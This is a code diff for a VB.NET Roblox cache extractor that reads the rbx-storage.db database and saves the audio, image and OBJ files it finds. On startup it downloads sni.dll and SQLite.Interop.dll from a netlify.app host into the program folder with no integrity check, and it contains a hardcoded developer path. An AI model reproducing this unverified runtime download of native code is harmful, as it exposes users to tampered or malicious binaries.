@@ -1,9 +1,24 @@
 ﻿
+Imports System.ComponentModel
+Imports System.Data.SQLite
+Imports System.Diagnostics.CodeAnalysis
+Imports System.Drawing
 Imports System.IO
-Imports System.Security.Principal
-Imports System.Numerics
-Imports System.Windows.Forms.VisualStyles.VisualStyleElement
 Imports System.Net
+Imports System.Net.Http
+Imports System.Net.Http.Headers
+Imports System.Numerics
+Imports System.Reflection
+Imports System.Reflection.Metadata
+Imports System.Security.Policy
+Imports System.Security.Principal
+Imports System.Text
+Imports System.Windows.Forms.VisualStyles.VisualStyleElement
+Imports ATL
+Imports ATL.AudioData
+Imports Microsoft.Win32
+Imports NAudio.Vorbis
+Imports NAudio.Wave
 'MIT License
 
 'Copyright (c) 2025 zv8001
@@ -29,26 +44,12 @@ Imports System.Net
 'https://github.com/zv8001/RBX-Audio-Extractor?tab=MIT-1-ov-file#readme
 
 Imports NVorbis
-Imports ATL.AudioData
-Imports ATL
-Imports Microsoft.Win32
-Imports System.Net.Http.Headers
-Imports System.Security.Policy
-Imports System.Text
-Imports System.ComponentModel
-Imports System.Diagnostics.CodeAnalysis
-Imports System.Net.Http
-Imports System.Reflection
-Imports System.Reflection.Metadata
-Imports System.Drawing
 Imports TagLib
-Imports NAudio.Wave
-Imports NAudio.Vorbis
 Public Class MainForm
 
     Dim DisableFade2 As Boolean = False
     Dim DisableFade As Boolean = False
-    Dim V = "v1.1.50"
+    Dim V = "v1.2.0"
     Private WithEvents backgroundWorker As New BackgroundWorker()
     Dim Stage As Integer = 0
     Dim tempDirectory = Path.GetTempPath
@@ -70,6 +71,20 @@ Public Class MainForm
     End Function
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+        Try
+            If Not My.Computer.FileSystem.FileExists($"{Application.StartupPath}\sni.dll") Then
+                My.Computer.Network.DownloadFile("https://animated-platypus-6ba0a9.netlify.app/sni.dll", $"{Application.StartupPath}\sni.dll")
+
+            End If
+
+            If Not My.Computer.FileSystem.FileExists($"{Application.StartupPath}\SQLite.Interop.dll") Then
+                My.Computer.Network.DownloadFile("https://animated-platypus-6ba0a9.netlify.app/SQLite.Interop.dll", $"{Application.StartupPath}\SQLite.Interop.dll")
+            End If
+        Catch ex As Exception
+            CallError("Failed to download the required dependencies.")
+        End Try
+
 
         TaskLBR.Visible = False
         LoadHTTP0.WorkerReportsProgress = True
@@ -184,6 +199,8 @@ del %0
 
     End Sub
 
+
+
     Private Sub LoadHttpBtn_Click(sender As Object, e As EventArgs) Handles LoadHttpBtn.Click
         LoadFullGame()
     End Sub
@@ -194,12 +211,131 @@ del %0
                   End Sub)
     End Sub
 
+    Private Function TryAndLoadImg(Img)
+        Try
+
+            Dim selectedFile = Img
+            PreVeiwImgBox.Image = Image.FromFile(selectedFile)
+            SelFile = selectedFile
+            Dim image0 As Image = Image.FromFile(SelFile)
+            Dim width As Integer = image0.Width
+            Dim height As Integer = image0.Height
+            Dim fileInfo As New FileInfo(SelFile)
+            Dim fileSize As Long = fileInfo.Length
+            ImgStats.Text = $"Dimensions: {width} x {height}" & vbCrLf &
+                                 $"File Size: {FormatBytes(fileSize)}"
+
+        Catch ex As Exception
+            Return False
+        End Try
+        Return True
+    End Function
+
+    Private Function DetectAndSave(bytes As Byte(), hash As String, oggDir As String, imageDir As String) As String
+        Dim oggHeader = Encoding.ASCII.GetBytes("OggS")
+        Dim pngHeader = New Byte() {&H89, &H50, &H4E, &H47, &HD, &HA, &H1A, &HA}
+        Dim jpgHeader = New Byte() {&HFF, &HD8}
+        Dim bmpHeader = Encoding.ASCII.GetBytes("BM")
+        Dim riffHeader = Encoding.ASCII.GetBytes("RIFF")
+        Dim webpSignature = Encoding.ASCII.GetBytes("WEBP")
+
+        Dim index As Integer
+
+        index = FindHeaderIndex(bytes, oggHeader)
+        If index >= 0 Then
+            Me.Invoke(Sub()
+                          output_log.Items.Add($"Saving entry: {hash & Path.Combine(oggDir, hash & ".ogg")}")
+                      End Sub)
+
+            System.IO.File.WriteAllBytes(Path.Combine(oggDir, hash & ".ogg"), bytes.Skip(index).ToArray())
+            Return "ogg"
+        End If
+
+        index = FindHeaderIndex(bytes, pngHeader)
+        If index >= 0 Then
+            Me.Invoke(Sub()
+                          output_log.Items.Add($"Saving entry: {hash & Path.Combine(oggDir, hash & ".png")}")
+                      End Sub)
+
+            System.IO.File.WriteAllBytes(Path.Combine(imageDir, hash & ".png"), bytes.Skip(index).ToArray())
+            Return "png"
+        End If
+
+        index = FindHeaderIndex(bytes, jpgHeader)
+        If index >= 0 Then
+            System.IO.File.WriteAllBytes(Path.Combine(imageDir, hash & ".jpg"), bytes.Skip(index).ToArray())
+            Me.Invoke(Sub()
+                          output_log.Items.Add($"Saving entry: {hash & Path.Combine(oggDir, hash & ".jpg")}")
+                      End Sub)
+
+            If Not TryAndLoadImg(Path.Combine(imageDir, hash & ".jpg")) Then
+                Me.Invoke(Sub()
+                              output_log.Items.Add($"SAVE FAILURE FILE IS CORRUPTED")
+                          End Sub)
+
+                My.Computer.FileSystem.DeleteFile(Path.Combine(imageDir, hash & ".jpg"))
+            End If
+
+            Return "jpg"
+        End If
+
+        index = FindHeaderIndex(bytes, bmpHeader)
+        If index >= 0 Then
+            System.IO.File.WriteAllBytes(Path.Combine(imageDir, hash & ".bmp"), bytes.Skip(index).ToArray())
+            Me.Invoke(Sub()
+                          output_log.Items.Add($"Saving entry: {hash & Path.Combine(oggDir, hash & ".bmp")}")
+                      End Sub)
+
+            If Not TryAndLoadImg(Path.Combine(imageDir, hash & ".bmp")) Then
+                Me.Invoke(Sub()
+                              output_log.Items.Add($"SAVE FAILURE FILE IS CORRUPTED")
+                          End Sub)
+
+                My.Computer.FileSystem.DeleteFile(Path.Combine(imageDir, hash & ".bmp"))
+            End If
+
+
+            Return "bmp"
+        End If
+
+        index = FindHeaderIndex(bytes, riffHeader)
+        If index >= 0 AndAlso bytes.Length > index + 12 Then
+            If bytes.Skip(index + 8).Take(4).SequenceEqual(webpSignature) Then
+                Me.Invoke(Sub()
+                              output_log.Items.Add($"Saving entry: {hash & Path.Combine(oggDir, hash & ".webp")}")
+                          End Sub)
+
+                System.IO.File.WriteAllBytes(Path.Combine(imageDir, hash & ".webp"), bytes.Skip(index).ToArray())
+
+                Return "webp"
+            End If
+        End If
+
+        Return "unknown"
+    End Function
+
+    Private Function FindHeaderIndex(data As Byte(), header As Byte()) As Integer
+        For i As Integer = 0 To data.Length - header.Length
+            If data.AsSpan(i, header.Length).SequenceEqual(header) Then
+                Return i
+            End If
+        Next
+        Return -1
+    End Function
+
+
     Private Sub LoadHTTP_DoWork_1(sender As Object, e As DoWorkEventArgs) Handles LoadHTTP0.DoWork
 
         'The old code was a complete disaster it utilized like a bunch of background workers and then progress bars to check to see if the background workers are done
         'just created a buggy mess of code that was bound to failure
         'so I basically just moved all of the bullshit all into one background worker
         'that was the only proper fix to this disaster I don't know why my dumbass coded it like that but it's fixed now in v1.1.2
+
+
+        'Updated to include the new Roblox system (.db file) as of 7/21/2025
+
+
+
 
         Me.Invoke(Sub()
                       HTTPLISTBOX.DisplayMember = "DisplayText"
@@ -216,47 +352,124 @@ del %0
             My.Computer.FileSystem.CreateDirectory(tempDirectory & "\RBXAudioExtractorIMG")
         End If
 
+        If Not My.Computer.FileSystem.FileExists(tempDirectory & "\RBXAudioExtractorOBJ") Then
+            My.Computer.FileSystem.CreateDirectory(tempDirectory & "\RBXAudioExtractorOBJ")
+        End If
+
         If Not My.Computer.FileSystem.FileExists(tempDirectory & "\RBX_SOUND_RIPPER_HTTP") Then
             My.Computer.FileSystem.CreateDirectory(tempDirectory & "\RBX_SOUND_RIPPER_HTTP")
         End If
+
+
+
+
+
+
         Me.Invoke(Sub()
                       TaskLBR.Visible = True
                   End Sub)
 
         Stage = 1
-        UpdateTaskLBR("Task 1/6")
+        UpdateTaskLBR("Task 1/4")
 
         RemoveAllFileInDir1(tempDirectory & "\RBX_SOUND_RIPPER_HTTP")
-        UpdateTaskLBR("Task 2/6")
+        UpdateTaskLBR("Task 2/4")
         RemoveAllFileInDir1(tempDirectory & "\RBXAudioExtractorIMG")
 
 
         Dim directories As String() = CType(e.Argument, String())
-        Dim sourceDir As String = $"{tempDirectory}\Roblox\http"
-        Dim targetDir As String = $"{tempDirectory}\RBX_SOUND_RIPPER_HTTP"
 
 
-        Dim files = Directory.GetFiles(sourceDir, "*.*", SearchOption.AllDirectories)
-        UpdateTaskLBR("Task 3/6")
-        For i As Integer = 0 To files.Length - 1
-
-            If LoadHTTP0.CancellationPending Then
-                e.Cancel = True
-                Exit For
-            End If
-
-            ProcessFile(files(i), targetDir)
 
 
-            LoadHTTP0.ReportProgress(CInt((i + 1) / files.Length * 100))
-        Next
+        UpdateTaskLBR("Task 3/4")
+
+
+        Dim dbPath As String = $"C:\Users\{Environment.UserName}\AppData\Local\Roblox\rbx-storage.db"
+        Dim primaryCacheDir As String = $"C:\Users\{Environment.UserName}\AppData\Local\Roblox\rbx-storage\"
+        Dim tempHttpDir As String = $"C:\Users\denve\AppData\Local\Temp\Roblox\http\"
+
+        Dim oggDir As String = Path.Combine(tempDirectory & "\RBX_SOUND_RIPPER_HTTP")
+        Dim imageDir As String = Path.Combine(tempDirectory & "\RBXAudioExtractorIMG")
+
+
+        If Not System.IO.File.Exists(dbPath) Then
+            Me.Invoke(Sub()
+                          CallError("DB file not found. Try launching a Roblox game and ensure you're using the desktop version of the app.")
+                      End Sub)
+
+            Return
+        End If
+
+        Try
+            Using conn As New SQLiteConnection($"Data Source={dbPath};Read Only=True;")
+                conn.Open()
+
+                Using cmd As New SQLiteCommand("SELECT id, content FROM files", conn)
+                    Using reader As SQLiteDataReader = cmd.ExecuteReader()
+                        Dim rows As New List(Of (String, Byte()))
+                        While reader.Read()
+                            If TypeOf reader("id") Is Byte() Then
+                                Dim idBytes As Byte() = DirectCast(reader("id"), Byte())
+                                Dim hash As String = BitConverter.ToString(idBytes).Replace("-", "").ToLowerInvariant()
+                                Dim contentBytes As Byte() = Nothing
+
+                                If Not reader.IsDBNull(1) Then
+                                    contentBytes = DirectCast(reader("content"), Byte())
+                                Else
+                                    Dim subfolder As String = hash.Substring(0, 2)
+                                    Dim fallback1 As String = Path.Combine(primaryCacheDir, subfolder, hash)
+                                    Dim fallback2 As String = Path.Combine(tempHttpDir, hash)
+
+                                    If System.IO.File.Exists(fallback1) Then
+                                        contentBytes = System.IO.File.ReadAllBytes(fallback1)
+                                    ElseIf System.IO.File.Exists(fallback2) Then
+                                        contentBytes = System.IO.File.ReadAllBytes(fallback2)
+                                    End If
+                                End If
+
+                                If contentBytes IsNot Nothing Then
+                                    rows.Add((hash, contentBytes))
+                                End If
+                            End If
+                        End While
+
+                        Dim total As Integer = rows.Count
+                        Dim current As Integer = 0
+
+                        For Each entry In rows
+                            Try
+                                Dim hash = entry.Item1
+                                Dim bytes = entry.Item2
+
+                                Dim ext = DetectAndSave(bytes, hash, oggDir, imageDir)
+                                current += 1
+                                Dim percent = CInt((current / total) * 100)
+
+                                Me.Invoke(Sub()
+                                              ProgressBar1.Value = Math.Min(percent, 100)
+                                          End Sub)
+                            Catch ex As Exception
+
+                            End Try
+
+                        Next
+                    End Using
+                End Using
+            End Using
+        Catch ex As Exception
+            Me.Invoke(Sub()
+                          CallError($"Error reading DB: {ex.Message}")
+                      End Sub)
+
+        End Try
+
+
 
 
         Stage = 3
-        UpdateTaskLBR("Task 4/6")
-        RenameFileExtensions(tempDirectory & "\RBX_SOUND_RIPPER_HTTP", ".ogg")
-        UpdateTaskLBR("Task 5/6")
-        RenameFileExtensions(tempDirectory & "\RBXAudioExtractorIMG", ".png")
+
+
 
         Me.Invoke(Sub()
                       ProgressBar1.Value = 99
@@ -271,7 +484,7 @@ del %0
 
 
         Dim musicFiles = Directory.GetFiles(tempDirectory & "\RBX_SOUND_RIPPER_HTTP", "*.ogg")
-        UpdateTaskLBR("Task 6/6")
+        UpdateTaskLBR("Task 4/4")
 
 
         Dim sortedMusicFiles = musicFiles.Select(Function(file)
@@ -319,14 +532,22 @@ del %0
         Next
 
 
-        Dim PngFiles = Directory.GetFiles(tempDirectory & "\RBXAudioExtractorIMG", "*.png")
+        Dim imageExtensions = New String() {"*.png", "*.jpg", "*.jpeg", "*.bmp", "*.gif", "*.webp"}
+        Dim allImageFiles As New List(Of String)
 
-        For Each file In PngFiles
-            Me.Invoke(Sub()
-                          LoadImgListBox.Items.Add(New With {.DisplayText = $"" & Path.GetFileName(file) & "", .FilePath = file})
-                      End Sub)
-
+        For Each ext In imageExtensions
+            allImageFiles.AddRange(Directory.GetFiles(tempDirectory & "\RBXAudioExtractorIMG", ext))
         Next
+
+        For Each file In allImageFiles
+            Me.Invoke(Sub()
+                          LoadImgListBox.Items.Add(New With {
+                      .DisplayText = Path.GetFileName(file),
+                      .FilePath = file
+                  })
+                      End Sub)
+        Next
+
 
         Stage = 0
         Me.Invoke(Sub()
@@ -349,13 +570,14 @@ del %0
         Try
             Dim fileBytes = System.IO.File.ReadAllBytes(file)
             Dim oggHeader As Byte() = Encoding.ASCII.GetBytes("OggS")
-            Dim PNGHeader As Byte() = {&H89, &H50, &H4E, &H47, &HD, &HA, &H1A, &HA}
+            Dim pngHeader As Byte() = {&H89, &H50, &H4E, &H47, &HD, &HA, &H1A, &HA}
+            Dim objHeader As Byte() = Encoding.ASCII.GetBytes("v ")
 
             Dim oggIndex As Integer = -1
-            Dim PNGIndex As Integer = -1
+            Dim pngIndex As Integer = -1
+            Dim objIndex As Integer = -1
 
             UpdateLog($"First 16 bytes of {file}: " & BitConverter.ToString(fileBytes.Take(16).ToArray()))
-
 
             For i As Integer = 0 To fileBytes.Length - 1
                 If oggIndex = -1 AndAlso i <= fileBytes.Length - oggHeader.Length Then
@@ -365,16 +587,22 @@ del %0
                     End If
                 End If
 
-                If PNGIndex = -1 AndAlso i <= fileBytes.Length - PNGHeader.Length Then
-                    If fileBytes.AsSpan(i, PNGHeader.Length).SequenceEqual(PNGHeader) Then
-                        PNGIndex = i
-                        UpdateLog($"Found PNG header at index {PNGIndex}")
+                If pngIndex = -1 AndAlso i <= fileBytes.Length - pngHeader.Length Then
+                    If fileBytes.AsSpan(i, pngHeader.Length).SequenceEqual(pngHeader) Then
+                        pngIndex = i
+                        UpdateLog($"Found PNG header at index {pngIndex}")
                     End If
                 End If
 
-                If oggIndex >= 0 AndAlso PNGIndex >= 0 Then Exit For
-            Next
+                If objIndex = -1 AndAlso i <= fileBytes.Length - objHeader.Length Then
+                    If fileBytes.AsSpan(i, objHeader.Length).SequenceEqual(objHeader) Then
+                        objIndex = i
+                        UpdateLog($"Found OBJ header at index {objIndex}")
+                    End If
+                End If
 
+                If oggIndex >= 0 AndAlso pngIndex >= 0 AndAlso objIndex >= 0 Then Exit For
+            Next
 
             If oggIndex >= 0 Then
                 UpdateLog($"Processing OGG file at index {oggIndex}")
@@ -383,35 +611,46 @@ del %0
                 System.IO.File.Copy(file, targetPath, True)
 
                 Dim modifiedBytes = fileBytes.Skip(oggIndex).ToArray()
-
-                UpdateLog($"Removing default Roblox parameters")
                 System.IO.File.WriteAllBytes(targetPath, modifiedBytes)
-                UpdateLog($"Done processing file: {file}")
+                UpdateLog($"Done processing OGG file: {file}")
             Else
                 UpdateLog($"Skipping: {file} is not a valid OGG file.")
             End If
 
-
-            If PNGIndex >= 0 Then
+            If pngIndex >= 0 Then
                 Dim imageDir = Path.Combine(tempDirectory, "RBXAudioExtractorIMG")
                 Directory.CreateDirectory(imageDir)
-                UpdateLog($"Processing PNG file at index {PNGIndex}")
 
+                UpdateLog($"Processing PNG file at index {pngIndex}")
                 Dim fileName = Path.GetFileName(file)
                 Dim targetPath = Path.Combine(imageDir, fileName)
                 System.IO.File.Copy(file, targetPath, True)
 
-                Dim modifiedBytes = fileBytes.Skip(PNGIndex).ToArray()
-
-                UpdateLog($"Removing default Roblox parameters")
+                Dim modifiedBytes = fileBytes.Skip(pngIndex).ToArray()
                 System.IO.File.WriteAllBytes(targetPath, modifiedBytes)
-                UpdateLog($"Done processing file: {file}")
+                UpdateLog($"Done processing PNG file: {file}")
             Else
                 UpdateLog($"Skipping: {file} is not a valid PNG file.")
             End If
+
+            If objIndex >= 0 Then
+                Dim objDir = Path.Combine(tempDirectory, "RBXAudioExtractorOBJ")
+                Directory.CreateDirectory(objDir)
+
+                UpdateLog($"Processing OBJ file at index {objIndex}")
+                Dim fileName = Path.GetFileName(file)
+                Dim targetPath = Path.Combine(objDir, fileName)
+                System.IO.File.Copy(file, targetPath, True)
+
+                Dim modifiedBytes = fileBytes.Skip(objIndex).ToArray()
+                System.IO.File.WriteAllBytes(targetPath, modifiedBytes)
+                UpdateLog($"Done processing OBJ file: {file}")
+            Else
+                UpdateLog($"Skipping: {file} is not a valid OBJ file.")
+            End If
+
         Catch ex As Exception
             UpdateLog($"Error processing file: {file} - {ex.Message}")
-
         End Try
     End Sub
 
@@ -1008,7 +1247,7 @@ del %0
                                      $"File Size: {FormatBytes(fileSize)}"
 
             Catch ex As Exception
-                CallError("File Not Found")
+                CallError($"File Not Found {ex}")
             End Try
 
         End If
@@ -1093,28 +1332,58 @@ del %0
     End Sub
 
     Private Sub ClearCache_DoWork(sender As Object, e As DoWorkEventArgs) Handles ClearCache.DoWork
-        Dim files = Directory.GetFiles($"{tempDirectory}\Roblox\http", "*.*", SearchOption.AllDirectories)
-        If Not Directory.Exists($"{tempDirectory}\Roblox\http") Then
-            UpdateLog($"ERROR: Directory does not exist: {tempDirectory}\Roblox\http")
-        Else
-            For i As Integer = 0 To files.Length - 1
+        Dim directories As String() = {
+        $"{tempDirectory}\Roblox\http",
+        $"C:\Users\{Environment.UserName}\AppData\Local\Roblox\rbx-storage"
+    }
+        Try
+            My.Computer.FileSystem.DeleteFile($"C:\Users\{Environment.UserName}\AppData\Local\Roblox\rbx-storage.db")
+
+            Dim allFiles As New List(Of String)
+
+
+            For Each dirPath In directories
+                If Directory.Exists(dirPath) Then
+                    Try
+                        allFiles.AddRange(Directory.GetFiles(dirPath, "*.*", SearchOption.AllDirectories))
+                    Catch ex As Exception
+                        UpdateLog($"ERROR: Failed to access directory {dirPath} with error: {ex.Message}")
+                    End Try
+                Else
+                    UpdateLog($"ERROR: Directory does not exist: {dirPath}")
+                End If
+            Next
+
+
+            For i As Integer = 0 To allFiles.Count - 1
                 Try
-                    UpdateLog($"Deleting file: {files(i)}")
-                    System.IO.File.Delete(files(i))
+                    UpdateLog($"Deleting file: {allFiles(i)}")
+                    System.IO.File.Delete(allFiles(i))
                 Catch ex As Exception
-                    UpdateLog($"Failed to Delete file with error: {ex.Message}")
+                    UpdateLog($"Failed to delete file with error: {ex.Message}")
                 End Try
 
-                Dim progress As Integer = CInt(((i + 1) / files.Length) * 100)
+                Dim progress As Integer = CInt(((i + 1) / allFiles.Count) * 100)
                 Me.Invoke(Sub()
                               ProgressBar1.Value = progress
                           End Sub)
             Next
+
             Me.Invoke(Sub()
                           ProgressBar1.Value = 100
                       End Sub)
-        End If
+
+        Catch ex As Exception
+            Me.Invoke(Sub()
+                          CallError("ERROR Roblox is currently using the database file please close Roblox before continuing | If Roblox is closed and you are receiving this error it is most likely because you have already cleared the cache")
+                      End Sub)
+
+        End Try
+
+
+
     End Sub
+
 
     Private Sub MSGPopup_DoWork(sender As Object, e As DoWorkEventArgs) Handles MSGPopup.DoWork
 
